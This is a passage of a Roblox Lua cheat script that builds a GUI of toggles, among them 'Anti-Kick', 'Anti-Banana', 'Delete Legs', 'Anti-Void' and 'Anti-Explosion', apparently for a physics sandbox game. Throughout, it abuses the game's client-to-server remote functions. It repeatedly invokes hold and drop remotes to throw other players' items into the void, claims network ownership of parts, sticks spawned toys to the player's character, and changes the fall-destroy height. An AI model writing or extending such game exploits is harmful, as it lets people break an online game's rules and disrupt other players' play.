                                end
                            end
                        end)
                    end
                end)
            end
        end
        if PlotItems then
            for _, plot in pairs(PlotItems:GetChildren()) do
                if plot.Name ~= "PlayersInPlots" then
                    for _, child in pairs(plot:GetChildren()) do
                        if child.Name == "FoodBanana" then
                            task.spawn(function()
                                local banana = child
                                local holdPart = nil
                                if banana then
                                    for _, descendant in pairs(banana:GetDescendants()) do
                                        if descendant.Name == "HoldPart" then
                                            holdPart = descendant
                                            break
                                        end
                                    end
                                end
                                if holdPart then
                                    local holdRF = nil
                                    local dropRF = nil
                                    local rigid = nil
                                    for _, descendant in pairs(holdPart:GetDescendants()) do
                                        if descendant.Name == "HoldItemRemoteFunction" then
                                            holdRF = descendant
                                        elseif descendant.Name == "DropItemRemoteFunction" then
                                            dropRF = descendant
                                        elseif descendant.Name == "RigidConstraint" then
                                            rigid = descendant
                                        end
                                    end
                                    if rigid and rigid:FindFirstChild("Attachment1") then
                                        repeat
                                            task.wait()
                                        until not rigid:FindFirstChild("Attachment1") or not banana.Parent
                                    end
                                    if dropRF and holdRF then
                                        repeat
                                            task.wait()
                                            task.spawn(function()
                                                pcall(function()
                                                    holdRF:InvokeServer(banana, GetCharacter())
                                                end)
                                            end)
                                            pcall(function()
                                                dropRF:InvokeServer(banana, CFrame.new(0, -51000, 0), Vector3.zero)
                                            end)
                                        until not banana.Parent or not Config.Antbananadest
                                        if banana.Parent then
                                            table.insert(Config.Bananans, banana)
                                        end
                                    end
                                end
                            end)
                        end
                    end
                    Config.AntiBananaCon[plot.Name .. "BananaConn"] = plot.ChildAdded:Connect(function(newChild)
                        if newChild.Name == "FoodBanana" then
                            task.wait(service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 900)
                            task.spawn(function()
                                local banana = newChild
                                local holdPart = nil
                                if banana then
                                    for _, descendant in pairs(banana:GetDescendants()) do
                                        if descendant.Name == "HoldPart" then
                                            holdPart = descendant
                                            break
                                        end
                                    end
                                end
                                if holdPart then
                                    local holdRF = nil
                                    local dropRF = nil
                                    local rigid = nil
                                    for _, descendant in pairs(holdPart:GetDescendants()) do
                                        if descendant.Name == "HoldItemRemoteFunction" then
                                            holdRF = descendant
                                        elseif descendant.Name == "DropItemRemoteFunction" then
                                            dropRF = descendant
                                        elseif descendant.Name == "RigidConstraint" then
                                            rigid = descendant
                                        end
                                    end
                                    if rigid and rigid:FindFirstChild("Attachment1") then
                                        repeat
                                            task.wait()
                                        until not rigid:FindFirstChild("Attachment1") or not banana.Parent
                                    end
                                    if dropRF and holdRF then
                                        repeat
                                            task.wait()
                                            task.spawn(function()
                                                pcall(function()
                                                    holdRF:InvokeServer(banana, GetCharacter())
                                                end)
                                            end)
                                            pcall(function()
                                                dropRF:InvokeServer(banana, CFrame.new(0, -51000, 0), Vector3.zero)
                                            end)
                                        until not banana.Parent or not Config.Antbananadest
                                        if banana.Parent then
                                            table.insert(Config.Bananans, banana)
                                        end
                                    end
                                end
                            end)
                        end
                    end)
                end
            end
        end
        Config.AntiBananaCon.PlayerAddedBanana = service.Players.PlayerAdded:Connect(function(player)
            player.CharacterAppearanceLoaded:Wait()
            task.wait(0.2)
            local container = service.Workspace:FindFirstChild(player.Name .. "SpawnedInToys")
            if container and Config.Antbananadest then
                for _, child in pairs(container:GetChildren()) do
                    if child.Name == "FoodBanana" then
                        task.spawn(function()
                            local banana = child
                            local holdPart = nil
                            if banana then
                                for _, descendant in pairs(banana:GetDescendants()) do
                                    if descendant.Name == "HoldPart" then
                                        holdPart = descendant
                                        break
                                    end
                                end
                            end
                            if holdPart then
                                local holdRF = nil
                                local dropRF = nil
                                local rigid = nil
                                for _, descendant in pairs(holdPart:GetDescendants()) do
                                    if descendant.Name == "HoldItemRemoteFunction" then
                                        holdRF = descendant
                                    elseif descendant.Name == "DropItemRemoteFunction" then
                                        dropRF = descendant
                                    elseif descendant.Name == "RigidConstraint" then
                                        rigid = descendant
                                    end
                                end
                                if rigid and rigid:FindFirstChild("Attachment1") then
                                    repeat
                                        task.wait()
                                    until not rigid:FindFirstChild("Attachment1") or not banana.Parent
                                end
                                if dropRF and holdRF then
                                    repeat
                                        task.wait()
                                        task.spawn(function()
                                            pcall(function()
                                                holdRF:InvokeServer(banana, GetCharacter())
                                            end)
                                        end)
                                        pcall(function()
                                            dropRF:InvokeServer(banana, CFrame.new(0, -51000, 0), Vector3.zero)
                                        end)
                                    until not banana.Parent or not Config.Antbananadest
                                    if banana.Parent then
                                        table.insert(Config.Bananans, banana)
                                    end
                                end
                            end
                        end)
                    end
                end
                Config.AntiBananaCon[container.Name .. "BananaConn"] = container.ChildAdded:Connect(function(newChild)
                    if newChild.Name == "FoodBanana" then
                        task.wait(service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 900)
                        task.spawn(function()
                            local banana = newChild
                            local holdPart = nil
                            if banana then
                                for _, descendant in pairs(banana:GetDescendants()) do
                                    if descendant.Name == "HoldPart" then
                                        holdPart = descendant
                                        break
                                    end
                                end
                            end
                            if holdPart then
                                local holdRF = nil
                                local dropRF = nil
                                local rigid = nil
                                for _, descendant in pairs(holdPart:GetDescendants()) do
                                    if descendant.Name == "HoldItemRemoteFunction" then
                                        holdRF = descendant
                                    elseif descendant.Name == "DropItemRemoteFunction" then
                                        dropRF = descendant
                                    elseif descendant.Name == "RigidConstraint" then
                                        rigid = descendant
                                    end
                                end
                                if rigid and rigid:FindFirstChild("Attachment1") then
                                    repeat
                                        task.wait()
                                    until not rigid:FindFirstChild("Attachment1") or not banana.Parent
                                end
                                if dropRF and holdRF then
                                    repeat
                                        task.wait()
                                        task.spawn(function()
                                            pcall(function()
                                                holdRF:InvokeServer(banana, GetCharacter())
                                            end)
                                        end)
                                        pcall(function()
                                            dropRF:InvokeServer(banana, CFrame.new(0, -51000, 0), Vector3.zero)
                                        end)
                                    until not banana.Parent or not Config.Antbananadest
                                    if banana.Parent then
                                        table.insert(Config.Bananans, banana)
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        end)
        for _, banana in pairs(Config.Bananans) do
            task.spawn(function()
                local holdPart = nil
                if banana then
                    for _, descendant in pairs(banana:GetDescendants()) do
                        if descendant.Name == "HoldPart" then
                            holdPart = descendant
                            break
                        end
                    end
                end
                if holdPart then
                    local holdRF = nil
                    local dropRF = nil
                    local rigid = nil
                    for _, descendant in pairs(holdPart:GetDescendants()) do
                        if descendant.Name == "HoldItemRemoteFunction" then
                            holdRF = descendant
                        elseif descendant.Name == "DropItemRemoteFunction" then
                            dropRF = descendant
                        elseif descendant.Name == "RigidConstraint" then
                            rigid = descendant
                        end
                    end
                    if rigid and rigid:FindFirstChild("Attachment1") then
                        repeat
                            task.wait()
                        until not rigid:FindFirstChild("Attachment1") or not banana.Parent
                    end
                    if dropRF and holdRF then
                        repeat
                            task.wait()
                            task.spawn(function()
                                pcall(function()
                                    holdRF:InvokeServer(banana, GetCharacter())
                                end)
                            end)
                            pcall(function()
                                dropRF:InvokeServer(banana, CFrame.new(0, -51000, 0), Vector3.zero)
                            end)
                        until not banana.Parent or not Config.Antbananadest
                        if banana.Parent then
                            table.insert(Config.Bananans, banana)
                        end
                    end
                end
            end)
        end
        table.clear(Config.Bananans)
    end
})

LeftGroupBox:AddToggle("AntiPaint", {
    Text = "Anti-Paint",
    Default = false,
    Callback = function(state)
        if state then
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
                    local clone = obj:Clone()
                    clone.Archivable = true
                    Config.paintPartsBackup[obj:GetDebugId()] = {
                        clone = clone,
                        parent = obj.Parent
                    }
                    obj:Destroy()
                end
            end
            table.insert(Config.paintConnections, workspace.DescendantAdded:Connect(function(obj)
                if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
                    task.defer(function()
                        if obj and obj.Parent then
                            local clone = obj:Clone()
                            clone.Archivable = true
                            Config.paintPartsBackup[obj:GetDebugId()] = {
                                clone = clone,
                                parent = obj.Parent
                            }
                            obj:Destroy()
                        end
                    end)
                end
            end))
            if localPlayer.Character then
                for _, v in ipairs(localPlayer.Character:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CanTouch = false
                        v.CanQuery = false
                    end
                end
            end
        else
            for _, conn in ipairs(Config.paintConnections) do
                if conn.Connected then conn:Disconnect() end
            end
            Config.paintConnections = {}
            for id, data in pairs(Config.paintPartsBackup) do
                if data.clone and data.parent then
                    data.clone.Parent = data.parent
                end
            end
            Config.paintPartsBackup = {}
            if localPlayer.Character then
                for _, v in ipairs(localPlayer.Character:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CanTouch = true
                        v.CanQuery = true
                    end
                end
            end
        end
    end
})

LeftGroupBox:AddToggle("teeeeees", {
    Text = "Anti-Input (Banjo)",
    Default = false,
    Callback = function(Value)
        if Value then
            if not Config.loopActive then
                local menuToys = service.ReplicatedStorage:FindFirstChild("MenuToys")
                if menuToys then
                    Config.spawnToyRemote = menuToys:FindFirstChild("SpawnToyRemoteFunction")
                    Config.destroyToyRemote = menuToys:FindFirstChild("DestroyToy")
                end
                if not Config.runLoop then
                    Config.loopActive = true
                    Config.runLoop = service.RunService.Heartbeat:Connect(function()
                        if not Config.loopActive then return end
                        local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                        if toyFolder then
                            local toy = toyFolder:FindFirstChild(Config.targetToy)
                            if not toy then
                                local cFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                local cToy = cFolder and cFolder:FindFirstChild(Config.targetToy)
                                if cToy and Config.destroyToyRemote then
                                    pcall(function()
                                        Config.destroyToyRemote:FireServer(cToy)
                                    end)
                                end

                                local spawnCFrame = (localPlayer.Character and localPlayer.Character.PrimaryPart)
                                    and localPlayer.Character.PrimaryPart.CFrame
                                    or CFrame.new(0, 5, 0)
                                if Config.spawnToyRemote then
                                    pcall(function()
                                        Config.spawnToyRemote:InvokeServer(Config.targetToy, spawnCFrame, Vector3.new(0, 90, 0))
                                    end)
                                end
                                for _ = 1, 15 do
                                    toy = toyFolder:FindFirstChild(Config.targetToy)
                                    if toy then break end
                                    task.wait(0.00000001)
                                end
                            end
                            if toy then
                                local character = localPlayer.Character
                                if toy and character then
                                    local head = character:FindFirstChild("Head")
                                    if head then
                                        local holdPart = toy:FindFirstChild("HoldPart")
                                        if holdPart then
                                            local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
                                            local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")
                                            if holdRemote and dropRemote then
                                                local dropPosition = head.CFrame * CFrame.new(0, 3, 0)
                                                task.spawn(function()
                                                    pcall(function()
                                                        holdRemote:InvokeServer(toy, character)
                                                        dropRemote:InvokeServer(toy, dropPosition, dropPosition)
                                                    end)
                                                end)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
                if not Config.respawnHandler then
                    Config.respawnHandler = localPlayer.CharacterAdded:Connect(function()
                        if Config.loopActive then
                            task.wait(0.5)
                            Config.loopActive = false
                            if Config.runLoop then
                                Config.runLoop:Disconnect()
                                Config.runLoop = nil
                            end
                            local cFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                            local cToy = cFolder and cFolder:FindFirstChild(Config.targetToy)
                            if cToy and Config.destroyToyRemote then
                                pcall(function()
                                    Config.destroyToyRemote:FireServer(cToy)
                                end)
                            end
                            task.wait(0.1)
                            if not Config.runLoop then
                                Config.loopActive = true
                                Config.runLoop = service.RunService.Heartbeat:Connect(function()
                                    if not Config.loopActive then return end
                                    local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                    if toyFolder then
                                        local toy = toyFolder:FindFirstChild(Config.targetToy)
                                        if not toy then
                                            local cFolder2 = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                            local cToy2 = cFolder2 and cFolder2:FindFirstChild(Config.targetToy)
                                            if cToy2 and Config.destroyToyRemote then
                                                pcall(function()
                                                    Config.destroyToyRemote:FireServer(cToy2)
                                                end)
                                            end

                                            local spawnCFrame = (localPlayer.Character and localPlayer.Character.PrimaryPart)
                                                and localPlayer.Character.PrimaryPart.CFrame
                                                or CFrame.new(0, 5, 0)
                                            if Config.spawnToyRemote then
                                                pcall(function()
                                                    Config.spawnToyRemote:InvokeServer(Config.targetToy, spawnCFrame, Vector3.new(0, 90, 0))
                                                end)
                                            end
                                            for _ = 1, 15 do
                                                toy = toyFolder:FindFirstChild(Config.targetToy)
                                                if toy then break end
                                                task.wait(0.00000001)
                                            end
                                        end
                                        if toy then
                                            local character = localPlayer.Character
                                            if toy and character then
                                                local head = character:FindFirstChild("Head")
                                                if head then
                                                    local holdPart = toy:FindFirstChild("HoldPart")
                                                    if holdPart then
                                                        local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
                                                        local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")
                                                        if holdRemote and dropRemote then
                                                            local dropPosition = head.CFrame * CFrame.new(0, 3, 0)
                                                            task.spawn(function()
                                                                pcall(function()
                                                                    holdRemote:InvokeServer(toy, character)
                                                                    dropRemote:InvokeServer(toy, dropPosition, dropPosition)
                                                                end)
                                                            end)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end)
                            end
                        end
                    end)
                end
                print("Protection active (Banjo).")
            end
        else
            Config.loopActive = false
            if Config.runLoop then
                Config.runLoop:Disconnect()
                Config.runLoop = nil
            end
            local cFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            local cToy = cFolder and cFolder:FindFirstChild(Config.targetToy)
            if cToy and Config.destroyToyRemote then
                pcall(function()
                    Config.destroyToyRemote:FireServer(cToy)
                end)
            end
            if Config.respawnHandler then
                Config.respawnHandler:Disconnect()
                Config.respawnHandler = nil
            end
            print("Protection stopped.")
        end
    end
})

LeftGroupBox:AddButton({
    Text = "Delete Legs",
    Func = function()
        local char = localPlayer.Character
        local hum = char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid")
        local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")
        local ll,rl = char:FindFirstChild("Left Leg"), char:FindFirstChild("Right Leg")
        if not ll or not rl then return end 
        local oldCF = char:GetPivot()
        local oldFal = workspace.FallenPartsDestroyHeight
        workspace.FallenPartsDestroyHeight = -50000
        RagdollRemote:FireServer(hrp, 1)
        task.wait(0.5)
        rl.CFrame = CFrame.new(0, -60000, 0)
        ll.CFrame = CFrame.new(0, -60000, 0)
        task.wait(0.1)
        char:PivotTo(CFrame.new(0, -55970, 0))
        task.wait(0.1)
        char:PivotTo(oldCF)
        workspace.FallenPartsDestroyHeight = oldFal
        task.delay(0.3,function()
            while task.wait() do 
                if not hum or hum.Health == 0 or char:FindFirstChild("Right Leg") then break end
                if localPlayer.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                    hum.HipHeight = 2
                else
                    hum.HipHeight = 0
                end
            end
        end)
    end
})

Toggles["AntiLag"] = LeftGroupBox:AddToggle("Antilag", {
    Text = "Anti-Lag",
    Default = false,
    Callback = function(Value)
        Config.CountLines = 0
        CharacterAndBeamMove.Enabled = not Value
        AntiShuriLag.Enabled = not Value
    end
})

LeftGroupBox:AddToggle("AntilagAuto", {
    Text = "Auto Anti-Lag",
    Default = true,
    Callback = function(Value)
        Config.AutoAntiLag = Value
    end
})

RightGroupBox:AddToggle("Antivoid", {
    Text = "Anti-Void",
    Default = false,
    Callback = function(state)
        if state then
            if not originalVoidHeight then
                originalVoidHeight = workspace.FallenPartsDestroyHeight
            end
            workspace.FallenPartsDestroyHeight = -1e95
        else
            workspace.FallenPartsDestroyHeight = originalVoidHeight or -100
        end
    end
})

RightGroupBox:AddToggle("Antiburn", {
    Text = "Anti-Burn",
    Default = false,
    Callback = function(enabled)
        local mapHole = workspace:WaitForChild("Map"):WaitForChild("Hole"):WaitForChild("PoisonBigHole")
        local holePosition = mapHole:GetPivot().Position
        local extPart = mapHole:FindFirstChild("ExtinguishPart")
        if not extPart then
            extPart = Instance.new("Part")
            extPart.Name = "ExtinguishPart"
            extPart.Size = Vector3.new(4, 1, 4)
            extPart.Anchored = true
            extPart.CanCollide = false
            extPart.Transparency = 1
            extPart.Position = holePosition
            extPart.Parent = mapHole
        end
        if enabled then
            if not Config.AntiBurnndada then
                Config.AntiBurnndada = service.RunService.Heartbeat:Connect(function()
                    local char = localPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local fireLight = hrp:FindFirstChild("FireLight")
                        local fireEmitter = hrp:FindFirstChild("FireParticleEmitter")

                        if fireLight or fireEmitter then
                            extPart.CFrame = hrp.CFrame
                        else
                            extPart.CFrame = CFrame.new(holePosition)
                        end
                    end
                end)
            end
        else
            if Config.AntiBurnndada then
                Config.AntiBurnndada:Disconnect()
                Config.AntiBurnndada = nil
            end
            if extPart then
                extPart.CFrame = CFrame.new(holePosition)
            end
        end
    end
})

RightGroupBox:AddToggle("AntiexeV", {
    Text = "Anti-Explosion (Visual)",
    Default = false,
    Callback = function(state)
        if PlayerScripts then
            local handler = PlayerScripts:FindFirstChild("ClientExoplosionHandler")
            if handler then
                handler.Enabled = not state
            end
        end
    end
})

RightGroupBox:AddToggle("Antiexe", {
    Text = "Anti-Explosion",
    Default = false,
    Callback = function(Value)
        Config.AntiExplosionActive = Value

        if Value then
            if Config.AntiExplosionConnection then
                Config.AntiExplosionConnection:Disconnect()
                Config.AntiExplosionConnection = nil
            end
            local char = GetCharacter()
            if not char then return end
            local hrp = char:WaitForChild("HumanoidRootPart")

            Config.AntiExplosionConnection = workspace.ChildAdded:Connect(function(model)
                if model.Name == "Part" and Config.AntiExplosionActive then
                    local mag = (model.Position - hrp.Position).Magnitude
                    if mag <= 20 then
                        hrp.Anchored = true
                        task.wait(0.01)

                        local rightArm = char:FindFirstChild("Right Arm")
                        if rightArm then
                            local ragdollPart = rightArm:FindFirstChild("RagdollLimbPart")
                            if ragdollPart then
                                while ragdollPart.CanCollide and Config.AntiExplosionActive do
                                    task.wait(0.001)
                                end
                            end
                        end

                        if Config.AntiExplosionActive then
                            hrp.Anchored = false
                        end
                    end
                end
            end)
        else
            if Config.AntiExplosionConnection then
                Config.AntiExplosionConnection:Disconnect()
                Config.AntiExplosionConnection = nil
            end
            local char = GetCharacter()
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.Anchored = false
                end
            end
        end
    end
})

RightGroupBox:AddToggle("Antistickey", {
	Text = "Anti-Sticky",
	Default = false,
	Callback = function(Value)
		Config.antiStickyToggle = Value
		if StickyPartsTouchDetection then
			PlayerScripts.StickyPartsTouchDetection.Disabled = Value
		end
	end,
})

antikick:AddToggle("BreakPCLD", {
	Text = "Break Pcld",
	Default = false,
	Callback = function(Value)
		local hkExpectDeath = false
		local hkSalmonList = {}
		hkSalmonList[localPlayer.UserId] = true
		local function hkApplySalmon(char)
			if not char then return end
			local newHum = char:WaitForChild("Humanoid", 5)
			if not newHum then return end
			if hkSalmonList[localPlayer.UserId] and not hkExpectDeath then
				hkExpectDeath = true
				newHum:ChangeState(Enum.HumanoidStateType.Dead)
			else
				hkExpectDeath = false
			end
		end
		localPlayer.CharacterAdded:Connect(function(char)
			hkApplySalmon(char)
		end)
		hkSalmonList[localPlayer.UserId] = Value and true or nil
		if Value then
			hkExpectDeath = false
			local char = localPlayer.Character
			local hum = char and char:FindFirstChildOfClass("Humanoid")
			if hum then hum.Health = 0 end
		end
	end
})

local SelectedToy = "SpookyCandle1"

antikick:AddDropdown("AntikickitemD", {
    Text = "anti kick item",
    Values = (function()
        local list = {
            ["Japanese Lantern"] = "JapaneseLantern",
            ["Spray Can"]        = "SprayCanWD",
            ["Spooky Candle"]    = "SpookyCandle1",
        }
        local values = {}
        for shortName, _ in pairs(list) do
            table.insert(values, shortName)
        end
        table.sort(values)
        return values
    end)(),
    Default = "Spooky Candle", 
    Callback = function(Value)
        local toyList = {
            ["Japanese Lantern"] = "JapaneseLantern",
            ["Spray Can"]        = "SprayCanWD",
            ["Spooky Candle"]    = "SpookyCandle1",
        }
        SelectedToy = toyList[Value]
    end
})

antikick:AddToggle("Antikickitem", {
    Text = "Anti-Kick [ITEM]",
    Default = false,
    Callback = function(Val)
        Config.kickitemToggle = Val 
        if Val then
            task.spawn(function()
                local Item, SoundPart
                while Config.kickitemToggle and task.wait() do 
                    local char = localPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    local hum = char and char:FindFirstChild("Humanoid")
                    local inPlot = localPlayer:FindFirstChild("InPlot")
                    local inv = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
                    if not hrp or not hum or hum.Health <= 0 or not inv then continue end  
                    if inPlot and inPlot.Value then continue end 
                    if not Config.kickitemPCLD and not Config.kickitemPCLDcon then
                        if Config.kickitemPCLDcon then Config.kickitemPCLDcon:Disconnect() end
                        Config.kickitemPCLD = nil
                        Config.kickitemPCLDcon = service.RunService.Heartbeat:Connect(function()
                            if Config.kickitemPCLD or not hrp or not hrp.Parent then 
                                if Config.kickitemPCLDcon then Config.kickitemPCLDcon:Disconnect() Config.kickitemPCLDcon = nil end
                                return
                            end
                            for _, v in pairs(workspace:GetChildren()) do 
                                if v.Name == "PlayerCharacterLocationDetector" and v:IsA("BasePart") then
                                    if (v.Position - hrp.Position).Magnitude <= 2 then 
                                        Config.kickitemPCLD = v
                                        break
                                    end
                                end
                            end
                        end)
                    end
                    Item = inv:FindFirstChild("AntiKickItem") 
                    SoundPart = Item and Item:FindFirstChild("Hitbox")
                    if not Item or not SoundPart then
                        for _,v in pairs(inv:GetChildren()) do 
                            if v.Name == "AntiKickItem" then 
                                pcall(function() DestroyToy:FireServer(v) end)
                            end
                        end
                        local ToyName = SelectedToy
                        local toyInv = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
                        if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then 
                            InPlot:GetPropertyChangedSignal("Value"):Wait()
                        end 
                        if CanSpawnToy and not CanSpawnToy.Value then 
                            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                        end
                        local currentHrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if not currentHrp then 
                            Item = nil 
                        else
                            local SpawnCF = (Config.kickitemPCLD or currentHrp).CFrame * CFrame.new(0, 14, 20)
                            local homeContainer = nil
                            local plotItems = workspace:FindFirstChild("PlotItems")
                            local plots = workspace:FindFirstChild("Plots")
                            if plots and plotItems then
                                for i = 1, 5 do 
                                    local Plot = plots:FindFirstChild("Plot"..i)
                                    if Plot then
                                        local sign = Plot:FindFirstChild("PlotSign")
                                        local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                                        if owners then
                                            for _,v in pairs(owners:GetChildren()) do 
                                                if v.Value == localPlayer.Name then 
                                                    homeContainer = plotItems:FindFirstChild("Plot"..i)
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    if homeContainer then break end
                                end
                            end
                            local Container = (InOwnedPlot and InOwnedPlot.Value) and homeContainer or toyInv
                            if not Container then 
                                Item = nil 
                            else
                                local spawnedObject = nil
                                local connection
                                connection = Container.ChildAdded:Connect(function(child)
                                    if child.Name == ToyName then
                                        spawnedObject = child
                                    end
                                end)
                                task.spawn(function()
                                    pcall(function()
                                        SpawnToyRemoteFunction:InvokeServer(ToyName, SpawnCF, Vector3.zero)
                                    end)
                                end)
                                local start = tick()
                                repeat task.wait() until spawnedObject or (tick() - start) > 2.5
                                if connection then connection:Disconnect() end
                                Item = spawnedObject
                            end
                        end
                        if not Item then continue end 
                        SoundPart = Item and FWD(Item, "Hitbox", 0.5)
                        if SoundPart then SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame) end
                        for _,v in pairs(Item:GetChildren()) do 
                            if v:IsA("BasePart") then 
                                v.CanCollide = false 
                                v.Transparency = 0.8
                                v.Color = Color3.fromRGB(0, 255, 255)
                            end
                        end
                        Item.Name = "AntiKickItem"
                    end
                    local isNotOwner = false
                    if SoundPart then
                        local po = SoundPart:FindFirstChild("PartOwner")
                        if not (po and po.Value == localPlayer.Name) then
                            isNotOwner = true
                        end
                    end
                    if SoundPart and isNotOwner then 
                        sno(SoundPart)
                    end
                    local targetPart = Config.kickitemPCLD or hrp:FindFirstChild("FirePlayerPart") or hrp
                    if SoundPart and targetPart then
                        SoundPart.CFrame = targetPart.CFrame
                        SoundPart.AssemblyLinearVelocity = Vector3.zero
                        SoundPart.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end)
        else
            if Config.kickitemPCLDcon then Config.kickitemPCLDcon:Disconnect() Config.kickitemPCLDcon = nil end
            Config.kickitemPCLD = nil
            task.spawn(function()
                local inv = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
                if inv and DestroyToy then
                    for _,v in pairs(inv:GetChildren()) do 
                        if v.Name == "AntiKickItem" then 
                            pcall(function() DestroyToy:FireServer(v) end)
                        end
                    end
                end
            end)
        end
    end
})

localPlayer.CharacterAdded:Connect(function(char)
	if Config.kickitemToggle then
		Config.kickitemPCLD = nil
		local hrp = char:WaitForChild("HumanoidRootPart", 5)
		if hrp then FindPCLD(hrp) end
	end
end)

Config.AntiKickToggle = antikick:AddToggle("atikikc", {
    Text = "Anti-Kick",
    Default = false,
    Callback = function(Value)
        Config.AntikickT = Value
        if Value then
            task.spawn(function()
                while Config.AntikickT do
                    task.wait(0.005)
                    if not localPlayer.Character
                        or not localPlayer.Character:FindFirstChild("Humanoid")
                        or localPlayer.Character.Humanoid.Health <= 0 then
                        continue
                    end
                    local isHome = false
                    local homeFolder = nil
                    if service.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                        for _, v in pairs(service.Workspace.Plots:GetChildren()) do
                            local sign = v:FindFirstChild("PlotSign")
                            local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                            if owners then
                                for _, b in pairs(owners:GetChildren()) do                                    if b.Value == localPlayer.Name then
                                        local folder = service.Workspace.PlotItems:FindFirstChild(v.Name)
                                        if folder then
                                            isHome = true
                                            homeFolder = folder
                                            break
                                        end
                                    end
                                end
                            end
                            if isHome then break end
                        end
                    end
                    local inv = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local kunai = inv and inv:FindFirstChild("NinjaShuriken")
                    if service.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                        if isHome and homeFolder and service.Workspace.Plots:FindFirstChild(homeFolder.Name) then
                            local sign = service.Workspace.Plots[homeFolder.Name]:FindFirstChild("PlotSign")
                            if sign and sign.ThisPlotsOwners.Value.TimeRemainingNum.Value > 89 then
                                local t = tick()
                                local spawnedTarget = nil
                                while not CanSpawnToy.Value do
                                    if not Config.AntikickT or tick() - t > 5 then
                                        break
                                    end
                                    task.wait(0.1)
                                end
                                if CanSpawnToy.Value then
                                    local currentHRP = HRP()
                                    if currentHRP then
                                        task.spawn(function()
                                            pcall(function()
                                                spawntoy(
                                                    "NinjaShuriken",
                                                    currentHRP.CFrame * CFrame.new(0, 12, 20),
                                                    Vector3.new(0, 0, 0)
                                                )
                                            end)
                                        end)
                                    end
                                    if isHome and homeFolder then
                                        spawnedTarget = homeFolder:WaitForChild("NinjaShuriken", 2)
                                    elseif not service.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) and inv then
                                        spawnedTarget = inv:WaitForChild("NinjaShuriken", 2)
                                    end
                                end
                                kunai = spawnedTarget
                                if kunai == nil then
                                    continue
                                end
                                kunai.Name = "AntiKick"
                                if kunai and kunai:FindFirstChild("StickyPart") then
                                    local currentHRP = HRP()
                                    if currentHRP then
                                        if kunai:FindFirstChild("SoundPart") then
                                            if not kunai.SoundPart:FindFirstChild("PartOwner") or kunai.SoundPart.PartOwner.Value ~= localPlayer.Name then
                                                SetNetworkOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
                                            end
                                        end
                                        local firePart = currentHRP:FindFirstChild("FirePlayerPart") or currentHRP:WaitForChild("FirePlayerPart", 5)
                                        if firePart then
                                            StickyPartEvent:FireServer(
                                                kunai.StickyPart,
                                                firePart,
                                                CFrame.new(0, 0, 0) * CFrame.Angles(0, math.rad(90), math.rad(90))
                                            )
                                        end
                                        for _, obj in pairs(kunai:GetChildren()) do
                                            if obj:IsA("BasePart") then
                                                obj.CanTouch = false
                                                obj.CanCollide = false
                                                obj.CanQuery = false
                                                obj.Transparency = 1
                                            end
                                        end
                                        local stickyPart = kunai.StickyPart
                                        if stickyPart and not stickyPart:FindFirstChild("KunaiPNG_GUI") then
                                            local gui = Instance.new("BillboardGui")
                                            gui.Name = "KunaiPNG_GUI"
                                            gui.Adornee = stickyPart
                                            gui.AlwaysOnTop = true
                                            gui.Size = UDim2.new(1.2, 0, 1.2, 0)
                                            gui.DistanceUpperLimit = 1000
                                            gui.Parent = stickyPart
                                            local img = Instance.new("ImageLabel")
                                            img.Size = UDim2.fromScale(1, 1)
                                            img.BackgroundTransparency = 1
                                            img.Image = "rbxassetid://89062714375517"
                                            img.Parent = gui
                                        end
                                    end
                                end
                            end
                        end
                    end
                    if not kunai then
                        if service.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                            continue
                        end
                        local t = tick()
                        local spawnedTarget = nil
                        while not CanSpawnToy.Value do
                            if not Config.AntikickT or tick() - t > 5 then
                                break
                            end
                            task.wait(0.1)
                        end
                        if CanSpawnToy.Value then
                            local currentHRP = HRP()
                            if currentHRP then
                                task.spawn(function()
                                    pcall(function()
                                        spawntoy(
                                            "NinjaShuriken",
                                            currentHRP.CFrame * CFrame.new(0, 12, 20),
